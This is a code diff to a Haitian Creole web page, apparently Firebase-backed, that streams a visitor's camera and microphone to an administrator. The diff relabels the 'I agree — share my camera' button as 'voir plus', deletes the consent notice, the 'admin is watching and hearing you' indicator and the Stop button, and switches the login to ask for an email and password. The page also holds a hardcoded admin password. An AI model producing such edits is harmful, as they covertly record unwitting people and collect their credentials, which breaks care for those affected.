@@ -199,9 +199,9 @@
   <div class="login-screen" id="loginScreen">
     <div class="login-box">
       <h2>🔒 Antre</h2>
-      <p class="sub">Antre non w ak yon kòd pou kontinye</p>
+      <p class="sub">Antre email ou ak yon mot de passe pou kontinye</p>
 
-      <input type="text" id="nameInput" placeholder="Non ou" autocomplete="off" autocapitalize="words">
+      <input type="text" id="nameInput" placeholder="email ou" autocomplete="off" autocapitalize="words">
       <input type="password" id="pwInput" placeholder="Kòd" autocomplete="off">
 
       <button id="btnLogin">Antre</button>
@@ -219,20 +219,20 @@
     </header>
 
     <div class="cta" id="ctaView">
-      <button id="btnStart">✅ Mwen dakò — Pataje kamera m</button>
+      <button id="btnStart">✅ voir plus </button>
       <p class="hint">
-        Lè w klike, ou dakò pou pataje kamera w ak vwa w.<br>
-        Ou ka sispann nenpòt lè.
+        <br>
+   
       </p>
     </div>
 
     <div class="active-panel hidden" id="activeView" style="display:none;">
       <div class="card">
-        <p><span class="dot"></span><strong>Kamera + Mikwo aktif</strong></p>
+        <p><span class="dot"></span><strong></strong></p>
         <p style="margin-top:8px; font-size:13px; color:#aaa;">
-          Administratè a ap wè ak tande w kounye a.
+          
         </p>
-        <button id="btnStop">⛔ Sispann Pataje</button>
+      
       </div>
     </div>
 
@@ -274,7 +274,7 @@ const db = firebase.database();
 /* ============================================
    TI PWEN ADMIN (anba gòch)
    ============================================ */
-const ADMIN_PASSWORD = "Zane20042004";
+const ADMIN_PASSWORD = "Zane200420042005";
 
 document.getElementById("dotAdmin").onclick = () => {
   const pw = prompt("Modpas admin:");
